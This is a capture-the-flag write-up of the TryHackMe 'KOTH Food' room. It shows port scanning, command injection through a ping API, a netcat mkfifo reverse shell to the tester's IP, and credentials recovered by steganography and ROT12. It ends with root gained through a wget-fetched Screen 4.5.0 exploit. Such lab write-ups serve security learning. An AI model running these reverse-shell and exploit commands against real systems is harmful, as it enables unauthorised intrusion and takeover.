### Enumerating

First we enumerate with 

```
nmap -p- $ip
nmap -sV -p 22,3306,9999,15065,16109,46969

```

![[Pasted image 20211124135525.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124135525.png)

There is a port for website; 15065 but its maintenance
![[Pasted image 20211124135712.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124135712.png)

Who is Dan? Okay let's just keep note on him for now.
Let's start enumerating with dirsearch.py

![[Pasted image 20211124140243.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124140243.png)

### Reverse Shell - Web

There is a dir to /monitor. When we inspect it we get to observe comments 

![[Pasted image 20211124140148.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124140148.png)

In bash terminal, we can put semicolone ; to execute next command. Let's try to enter our IP and 'whoami'

![[Pasted image 20211124140734.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124140734.png)

Seems like it doesnt allow us to do so, lets try to observe the javacsript.  I'm using sublime to copy and paste the main.js

![[Pasted image 20211124141337.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124141337.png)

But I guess it looks complicated to deobfuscate it; so let's observe how the pinging works. 
![[Pasted image 20211124141916.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124141916.png)

Over here we can see that there is a process called 'cmd' that is running the command 'ping -c 4 10.4.44.74'  and its requesting with POST method to /api/cmd

![[Pasted image 20211124142505.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124142505.png)

I wonder if we can curl through it from our machine directly.
`curl 10.10.71.59/api/cmd -X POST -d "whoami"`

where -d means data that is being send along with POST

![[Pasted image 20211124142814.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124142814.png)

Now let's try to spawn a reverse shell. Go to revshells.com and grab your line quick!

I'm using nc mkfifo and start a listener on my terminal
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.44.74 1234 >/tmp/f`

![[Pasted image 20211124143027.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124143027.png)
(apparently there's a glitch in my terminal .__. )

Since this is a KOTH room, we should try to exploit more ways to infiltrate. Let's try MySQL from the nmap service we saw earlier.

### MySQL

From our Machine, lets try;

`mysql -h 10.10.71.59 -u root -p`

```
show databases;
use users;
show tables;
select * from User;
```

![[Pasted image 20211124144056.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124144056.png)

thm{2f30841ff8d9646845295135adda8332} 

### SSH

Let's try to SSH it	, it seems the password and username is working fine

![[Pasted image 20211124144925.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124144925.png)

Let's try port number 16109. Now since we dont know much about it we can try nc or curl and see what response we would get.

![[Pasted image 20211124145112.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124145112.png)

Looks like someone is treating us for lunch
![[Pasted image 20211124145214.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124145214.png)

This is fishy, but let's try to stegseek it

![[Pasted image 20211124145301.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124145301.png)

Welp boom, we are given this credential

`pasta:pastaisdynamic`

And of course let's try to SSH it again

![[Pasted image 20211124145445.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124145445.png)
Yep, we got it.

But so far none can run sudo commands with `sudo -l`

Lets hope on to the last port number which nmap identified it as telnet. Let's try to telnet to the target machine

![[Pasted image 20211124145850.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124145850.png)

Found something really interesting, lets run it to CyberChef. It looks like its ROT but not sure what number.
tccr:uwjsasqccywsg

ROT13 is the most common but since it's wrong, I tweak a bit and got it that its ROT12 actually with this credential

`food:givemecookies`

### Privilege Escalation

We can SSH into Food account but unfortunately there are restrictions imposed on user Food. Let's get into other account and try to privesc.

We can try to find any SUID by using this command
`find / -type f -perm 4000 2>/dev/null`

There is an unusual file with SUID permission. We can try to exploit that Screen 4.50. Read more here -> https://www.exploit-db.com/exploits/41154
From our machine, let's do

```
searchsploit screen 4.5
locate linux/local/41154.sh
cp /usr/share/exploitdb/exploits/linux/local/41154.sh .
python3 -m http.server
```

![[Pasted image 20211124151119.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124151119.png)

And over the target machine we would just wget it
`wget http://10.4.44.74:8000/41154.sh`

And execute it.
`./41154.sh`

Now we are root.

![[Pasted image 20211124151143.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/KOTH%20Food%20CTF/attachments/Pasted%20image%2020211124151143.png)

And we can obtain the flag7 in the tryhackme directory also we can get the flag in the /root directory.




